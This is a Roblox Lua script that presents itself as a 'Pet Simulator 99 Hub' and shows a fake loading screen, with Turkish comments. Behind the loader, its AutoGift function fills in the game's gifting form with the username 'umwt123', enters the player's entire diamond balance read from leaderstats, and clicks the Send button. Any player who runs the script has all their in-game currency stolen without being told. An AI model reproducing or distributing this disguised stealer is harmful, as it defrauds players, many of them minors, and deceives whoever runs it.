local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================== LOADING SCREEN ======================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99Loader"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local BlackBG = Instance.new("Frame")
BlackBG.Size = UDim2.new(1, 0, 1, 0)
BlackBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackBG.BorderSizePixel = 0
BlackBG.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(0, 500, 0, 100)
LoadingText.Position = UDim2.new(0.5, -250, 0.42, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Pet Simulator 99 Hub Loading..."
LoadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
LoadingText.TextScaled = true
LoadingText.Font = Enum.Font.GothamBold
LoadingText.Parent = BlackBG

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 400, 0, 80)
PercentText.Position = UDim2.new(0.5, -200, 0.55, 0)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.fromRGB(255, 0, 0)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = BlackBG

local percent = 0
spawn(function()
    while percent < 100 do
        percent = percent + math.random(5, 12)
        if percent > 100 then percent = 100 end
        PercentText.Text = percent .. "%"
        wait(0.09)
    end
    PercentText.Text = "100%"
    task.wait(1.5)
    AutoGift()
end)

-- ====================== AUTO GIFT (ELMAS OTOMATİK) ======================
function AutoGift()
    print("🚀 Auto Gift Başlıyor...")
    task.wait(2.5)
    
    local playerGui = LocalPlayer.PlayerGui
    
    -- 1. Roblox Username
    local usernameBox = nil
    for _, v in ipairs(playerGui:GetDescendants()) do
        if v:IsA("TextBox") and (v.PlaceholderText:find("Username") or v.Name:find("Username")) then
            usernameBox = v
            break
        end
    end
    if usernameBox then
        usernameBox.Text = "umwt123"
        firesignal(usernameBox.FocusLost)
        print("✅ Username: umwt123 yazıldı")
    end
    
    task.wait(1)
    
    -- 2. Elmas Miktarını Otomatik Bul
    local diamonds = 0
    if LocalPlayer:FindFirstChild("leaderstats") then
        local leaderstats = LocalPlayer.leaderstats
        if leaderstats:FindFirstChild("Diamonds") then
            diamonds = leaderstats.Diamonds.Value
        elseif leaderstats:FindFirstChild("💎 Diamonds") then
            diamonds = leaderstats["💎 Diamonds"].Value
        elseif leaderstats:FindFirstChild("Gems") then
            diamonds = leaderstats.Gems.Value
        end
    end
    
    print("Bulunan Elmas: " .. diamonds)
    
    -- Elmas TextBox'una yaz
    local diamondBox = nil
    for _, tb in ipairs(playerGui:GetDescendants()) do
        if tb:IsA("TextBox") and (tb.Text == "0" or tb.PlaceholderText:find("0") or tb.Name:lower():find("diamond")) then
            diamondBox = tb
            break
        end
    end
    
    if diamondBox then
        diamondBox.Text = tostring(diamonds)
        firesignal(diamondBox.FocusLost)
        print("✅ Elmas yazıldı: " .. diamonds)
    else
        print("Elmas kutusu bulunamadı")
    end
    
    task.wait(1.5)
    
    -- 3. Gönder Butonu
    local sendButton = nil
    for _, btn in ipairs(playerGui:GetDescendants()) do
        if btn:IsA("TextButton") and btn.Text:find("Gönder") then
            sendButton = btn
            break
        end
    end
    
    if sendButton then
        firesignal(sendButton.MouseButton1Click)
        print("✅ GÖNDER butonuna basıldı!")
    else
        print("Gönder butonu bulunamadı")
    end
end

print("✅ PS99 Hub Yüklendi - Elmas otomatik algılanıyor")
